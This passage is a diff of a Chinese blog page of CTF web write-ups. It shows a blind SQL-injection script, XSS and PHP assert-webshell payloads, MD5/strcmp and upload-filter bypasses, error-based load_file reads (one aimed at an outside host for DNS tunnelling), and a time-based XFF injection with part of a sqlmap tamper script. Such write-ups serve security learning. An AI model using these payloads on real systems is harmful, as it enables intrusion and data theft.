@@ -90,6 +90,104 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
+                    WhaleCTF的Web题目 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-06-06   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
+<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
+<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
+<pre><code>#coding:utf-8
+import requests
+
+def send(flag,charset):
+    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
+    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    for i in range(len(charset)):
+        c = flag + charset[i]
+        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
+        d = &quot;username={}&amp;password=admin&quot;.format(payload)
+        r = requests.post(url,data=d,headers=h)
+        if &quot;whaleadmin&quot; in r.text:
+            return i
+
+def main():
+    flag = &quot;&quot;
+    num = &quot;0123456789&quot;
+    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    charset = list(num + a_z)
+    for i in range(0,80):
+        ret = send(flag, charset)
+        flag += charset[ret-1]
+        print flag
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
+<pre><code>&lt;?php
+echo &quot;waht the hell?&quot;;
+$flag = &quot;*******&quot;; 
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
+{ 
+    $password = $_POST[&#39;password&#39;]; 
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
+    { 
+        echo &#39;Wrong Format&#39;; 
+        exit; 
+    } 
+    while (TRUE) 
+    { 
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
+        if (6 &gt; preg_match_all($reg, $password, $arr)) 
+            break; 
+        $c = 0; 
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
+        foreach ($ps as $pt) 
+        { 
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
+                $c += 1; 
+        } 
+        if ($c &lt; 3) break; 
+        if (&quot;42&quot; == $password) echo $flag; 
+        else echo &#39;Wrong password&#39;; 
+        exit; 
+    } 
+}
+?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
+<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
+<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
+<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/06/06/WhaleCTF的Web题目/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/06/06/Web题目/"> 
                     CTF中的Web题目 
                 </a>
@@ -119,72 +217,207 @@
 <h3 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h3><p><img src="https://s1.ax1x.com/2018/06/17/CvxWWR.png" alt="bianliang"><br>preg_match进行正则匹配，\w+匹配一或多个字符数字下划线，后面dump的变量是可变变量，所以可以借机把我们想要的变量打印出来，一开始我构造args=flag，并无卵用。返回NULL，说明不存在flag这个变量，那我们就把所有的变量都打印出来。</p>
 <p>这里用到超全局变量GLOBAL,构造args=GLOBAL,打印出来所有变量即可</p>
 <h3 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h3><p>研究了一天的xss，并没有什么实际的进展。这道xss是用htmlspecialchars()函数将&lt;、&gt;进行html实体化，让浏览器在html编码解析时，发现它是实体化的编码，就把他们解码为普通的可视化的&lt;、&gt;。这里我们看源码知道这是utf-8的编码方式，我们如果用unicode的方式编码&lt;，后端不识别这个unicode为&lt;，但html解析之后，unicode又变回&lt;，js解析器解析完script标签之后，触发Js引擎执行这段js代码。所以我们构造playload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u003cscript\u003ealert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure>
-
-<p>\u开头好像表示的是Utf-8的unicode编码形式（瞎猜的），好菜啊。。这个并没有完全搞懂。<br>google了半天的浏览器渲染，明白了这个道理：一旦html解析到script标签的时候，就会启动js解析器来解析标签里面的东西，js解析完了之后就执行里面的Js语句。html继而再向后进行解析。</p>
+<pre><code>\u003cscript\u003ealert(_key_)\u003c/script\u003e</code></pre><p>\u开头好像表示的是Utf-8的unicode编码形式（瞎猜的），好菜啊。。这个并没有完全搞懂。<br>google了半天的浏览器渲染，明白了这个道理：一旦html解析到script标签的时候，就会启动js解析器来解析标签里面的东西，js解析完了之后就执行里面的Js语句。html继而再向后进行解析。</p>
 <p>贴几个介绍编码绕过xss的文章：<br><a href="https://blog.csdn.net/xiaozhuxmen/article/details/52014901" target="_blank" rel="noopener">浏览器加载、解析、渲染的过程</a><br><a href="https://www.cnblogs.com/flycat-2016/p/6507543.html" target="_blank" rel="noopener">xss编码与绕过</a><br><a href="http://www.freebuf.com/articles/web/43285.html" target="_blank" rel="noopener">xss编码剖析</a><br><a href="https://unicode-table.com/en/#control-character" target="_blank" rel="noopener">字符转unicode</a></p>
 <h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>提示让我们看源码，发现有一串url编码的东西，<br>解码后传值就行了，拼接两个escape的值</p>
 <h3 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h3><p>备份文件泄露，php代码泄露检测工具<a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">SourceLeakHacker</a></p>
 <h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>查看源码有一个1p.html页面，访问之后出现一堆base64编码的内容，解码后是页面源码，费劲心思构造b，没想到最后直接访问f4l2a3g.txt就可以…</p>
 <h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><p>题目给出你了源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$poc=&quot;a#s#s#e#r#t&quot;; </span><br><span class="line">$poc_1=explode(&quot;#&quot;,$poc);</span><br><span class="line">$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; </span><br><span class="line">$poc_2($_GET[&apos;s&apos;]) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>也就是说会执行一个(assert函数)[<a href="http://www.php.net/manual/zh/function.assert.php]" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.assert.php]</a><br>所以我们只需要给s赋值为我们想要执行的语句。<br>看到别人的Wp,应该是先扫描一下当前目录看有什么东西<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = print_r(scandir(&apos;./&apos;))</span><br></pre></td></tr></table></figure>
-
-<p>这里我们用print_r来打印数组相关信息，而不是print。<br>关于绝对路径的用法：</p>
+<pre><code>&lt;?php 
+$poc=&quot;a#s#s#e#r#t&quot;; 
+$poc_1=explode(&quot;#&quot;,$poc);
+$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; 
+$poc_2($_GET[&#39;s&#39;]) 
+?&gt;</code></pre><p>也就是说会执行一个(assert函数)[<a href="http://www.php.net/manual/zh/function.assert.php]" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.assert.php]</a><br>所以我们只需要给s赋值为我们想要执行的语句。<br>看到别人的Wp,应该是先扫描一下当前目录看有什么东西<br>payload:</p>
+<pre><code>s = print_r(scandir(&#39;./&#39;))</code></pre><p>这里我们用print_r来打印数组相关信息，而不是print。<br>关于绝对路径的用法：</p>
 <ol>
 <li>./  当前目录</li>
 <li>../ 上层目录</li>
 <li>../../  上2层目录</li>
 </ol>
 <h3 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h3><p>这个跟实验吧php是最好的语言有点类似。<br>打开它提示的链接，然后代码审计。<br>md5可以用数组绕过，也可以用0e开头的md5值绕过。<br>Strcmp可以用数组绕过。<br>我的payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1</span><br></pre></td></tr></table></figure>
-
-<p>po一个php函数漏洞的总结<a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">链接</a></p>
+<pre><code>?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1</code></pre><p>po一个php函数漏洞的总结<a href="https://blog.csdn.net/qq_31481187/article/details/60968595" target="_blank" rel="noopener">链接</a></p>
 <h3 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h3><p>hint:sql约束攻击<br>去百度了一下什么叫<a href="https://blog.csdn.net/qq_32400847/article/details/54137747" target="_blank" rel="noopener">约束攻击</a><br>约束的意思就是对长度进行约束，看完上面的链接基本上就知道注册时的用户名怎么构造了。<br>我的构造:<br><code>admin                                     （前方为空格）</code></p>
 <h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>这个题有点意思，涉及到extract()变量覆盖，看一下给的源代码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">extract($_GET);</span><br><span class="line">if (!empty($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line">if ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
+<pre><code>&lt;?php
+extract($_GET);
+if (!empty($ac))
+{
+$f = trim(file_get_contents($fn));
+if ($ac === $f)
+{
+echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;;
+}
+else
+{
+echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;;
+}
+}
+?&gt;</code></pre><ul>
 <li><p>首先了解一下empty函数<br>这个函数一开始把我误导了，empty是用来测试变量是否已经配置。若变量已存在、非空字符串或者非零，则返回 false 值，反之返回ture。</p>
 </li>
 <li><p>再介绍一下extract函数：<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
 </li>
 </ul>
 <p>题目提示有txt文件，我们访问一下flag.txt，发现内容是：flags。<br>我们要传入一个非空的ac,让它的值===$f，$f来自于读取文件获得里面的字符串，文件名叫$fn。目前我们不知道$fn指向哪个文件，但是我们知道有flag.txt这个文件。所以我们让$ac=flags并且$fn=flag.txt就行了<br>payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?$ac=flags&amp;$fn=flag.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>这是一个上传绕过题目，后缀很名单检测和类型检测<br>php别名php2, php3, php4, php5, phps, pht, phtm, phtml<br>发现php5可以绕过，还要更改 Content-Type里，把multipart改成大写（搞不懂问什么）。<br>贴一个上传绕过总结的[链接]（<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）</a></p>
+<pre><code>?$ac=flags&amp;$fn=flag.txt</code></pre><h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><p>这是一个上传绕过题目，后缀很名单检测和类型检测<br>php别名php2, php3, php4, php5, phps, pht, phtm, phtml<br>发现php5可以绕过，还要更改 Content-Type里，把multipart改成大写（搞不懂问什么）。<br>贴一个上传绕过总结的[链接]（<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）" target="_blank" rel="noopener">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/）</a></p>
 <p>上传文件时waf会检查哪里？<br>请求的url<br>Boundary边界<br>MIME类型<br>文件扩展名<br>文件内容</p>
 <p>常见扩展名黑名单：<br>asp|asa|cer|cdx|aspx|ashx|ascx|asax<br>php|php2|php3|php4|php5|asis|htaccess<br>htm|html|shtml|pwml|phtml|phtm|js|jsp<br>vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</p>
 <h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><p>写着sql注入的名字，看到网上说竟然是DS_Store源码泄露？？exm？？？最后直接访问<a href="http://120.24.86.145:8007/web2/flag，就可以下载到flag" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/flag，就可以下载到flag</a></p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">题目链接</a><br>既然提示了报错注入，我们就按照提示来注入，我使用的是updatexml报错函数，测试一下：<br><img src="https://s1.ax1x.com/2018/06/06/C7bVXV.png" alt="ceshi"><br>可以看到，爆出了库名，说明这个方法可行。题目给了提示让我们读文件内容，要用到load_file函数，先看一下函数的几种用法举例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/boot.ini&apos;)</span><br><span class="line">select load_file(0x633a2f626f6f742e696e69)</span><br><span class="line">select load_file(&apos;//ecma.io/1.txt&apos;) # smb协议</span><br><span class="line">select load_file(&apos;\\\\ecma.io\\1.txt&apos;) # 可用于DNS隧道</span><br></pre></td></tr></table></figure>
-
-<p>我们的思路是把concat里面查询数据库的句子替换为substr（返回值函数），不让报错函数打印数据库的名字了，而是打印我们读到的文件内容，substr就相当于printf的作用。题目过滤了单引号，我们就用十六进制表示绝对路径，但是要用到hex()函数让数据库知道我们要将字符串转为16进制。值得注意的是concat语句第一个空不可省略，否则打印不出内容。完整的payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30)),1)</span><br></pre></td></tr></table></figure>
-
-<p>先返回读到内容前30位的16进制，再更改语句依次往后读：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30)),1)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s1.ax1x.com/2018/06/06/C7bm0U.png" alt="tupian"><br>将读到的16进制转换为字符：<br><img src="https://s1.ax1x.com/2018/06/06/C7bemT.png" alt="jieguo"></p>
+<pre><code>select load_file(&#39;c:/boot.ini&#39;)
+select load_file(0x633a2f626f6f742e696e69)
+select load_file(&#39;//ecma.io/1.txt&#39;) # smb协议
+select load_file(&#39;\\\\ecma.io\\1.txt&#39;) # 可用于DNS隧道</code></pre><p>我们的思路是把concat里面查询数据库的句子替换为substr（返回值函数），不让报错函数打印数据库的名字了，而是打印我们读到的文件内容，substr就相当于printf的作用。题目过滤了单引号，我们就用十六进制表示绝对路径，但是要用到hex()函数让数据库知道我们要将字符串转为16进制。值得注意的是concat语句第一个空不可省略，否则打印不出内容。完整的payload:</p>
+<pre><code>http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30)),1)</code></pre><p>先返回读到内容前30位的16进制，再更改语句依次往后读：</p>
+<pre><code>http://103.238.227.13:10088/?id=1%0aor%0aupdatexml(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30)),1)</code></pre><p><img src="https://s1.ax1x.com/2018/06/06/C7bm0U.png" alt="tupian"><br>将读到的16进制转换为字符：<br><img src="https://s1.ax1x.com/2018/06/06/C7bemT.png" alt="jieguo"></p>
 <h3 id="insert-into注入"><a href="#insert-into注入" class="headerlink" title="insert into注入"></a>insert into注入</h3><p>先审计一下源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+<pre><code>error_reporting(0);
 
-<p>explode过滤逗号，所以报错注入肯定行不通。看到网上的Wp说是基于时间的盲注，盲注点很显然是XFF。经过测试payload有效：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1&apos;+sleep(5) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+function getIp(){
+$ip = &#39;&#39;;
+if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
+$ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+}else{
+$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+}
+$ip_arr = explode(&#39;,&#39;, $ip);
+return $ip_arr[0];
 
-<p>页面返回有一个延时，这里就不能用if(,,)语句了，因为过滤了逗号，用另一个注入语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select case when (条件) then 代码1 else 代码 2 end</span><br></pre></td></tr></table></figure>
+}
 
-<p>于是有了如下的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and (select case when (select length(flag) from flag limit 1)=32 then sleep(5) else 1 end) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
+$host=&quot;localhost&quot;;
+$user=&quot;&quot;;
+$pass=&quot;&quot;;
+$db=&quot;&quot;;
 
-<p>emmm,手注是不可能的，这辈子是不可能手注的（手动滑稽），我们抓个包让sqlmap以XFF为注入点扫描，再加个过滤逗号的tamper就好了。若以XFF为注入点，则要在抓包后的导出文件里XFF后加*，标识为注入点如图：<br><img src="https://s1.ax1x.com/2018/06/06/CHe1Cd.png" alt="zhurudian"><br>然后找了网上大神的过滤逗号的tamper，放在Sqlmap目录里，命名为comamalessmysql.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Replaces some instances with something whthout comma </span><br><span class="line"></span><br><span class="line">    Requirement:</span><br><span class="line">        * MySQL</span><br><span class="line"></span><br><span class="line">    Tested against:</span><br><span class="line">        * MySQL 5.0</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; tamper(&apos;ISNULL(TIMESTAMPADD(MINUTE,7061,NULL))&apos;)</span><br><span class="line">    &apos;ISNULL(NULL)&apos;</span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; tamper(&apos;MID(VERSION(), 2, 1)&apos;)</span><br><span class="line">    &apos;MID(VERSION() FROM 2 FOR 1)&apos;</span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt; tamper(&apos;IF(26=26,0,5)&apos;)</span><br><span class="line">    &apos;CASE WHEN 26=26 THEN 0 ELSE 5 END&apos;</span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; tamper(&apos;IFNULL(NULL,0x20)&apos;)</span><br><span class="line">    &apos;CASE WHEN NULL=NULL THEN 0x20 ELSE NULL END&apos;</span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt; tamper(&apos;LIMIT 2, 3&apos;)</span><br><span class="line">    &apos;LIMIT 3 OFFSET 2&apos;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    def commalessif(payload):</span><br><span class="line">        if payload and payload.find(&quot;IF&quot;) &gt; -1:</span><br><span class="line">            while payload.find(&quot;IF(&quot;) &gt; -1:</span><br><span class="line">                index = payload.find(&quot;IF(&quot;)</span><br><span class="line">                depth = 1</span><br><span class="line">                comma1, comma2, end = None, None, None</span><br><span class="line"></span><br><span class="line">                for i in xrange(index + len(&quot;IF(&quot;), len(payload)):</span><br><span class="line">                    if depth == 1 and payload[i] == &apos;,&apos; and not comma1:</span><br><span class="line">                        comma1 = i</span><br><span class="line">                        </span><br><span class="line">                    elif depth == 1 and payload[i] == &apos;,&apos; and comma1:</span><br><span class="line">                        comma2 = i</span><br><span class="line"></span><br><span class="line">                    elif depth == 1 and payload[i] == &apos;)&apos;:</span><br><span class="line">                        end = i</span><br><span class="line">                        break</span><br><span class="line"></span><br><span class="line">                    elif payload[i] == &apos;(&apos;:</span><br><span class="line">                        depth += 1</span><br><span class="line"></span><br><span class="line">                    elif payload[i] == &apos;)&apos;:</span><br><span class="line">                        depth -= 1</span><br><span class="line"></span><br><span class="line">                if comma1 and comma2 and end:</span><br><span class="line">                    _ = payload[index + 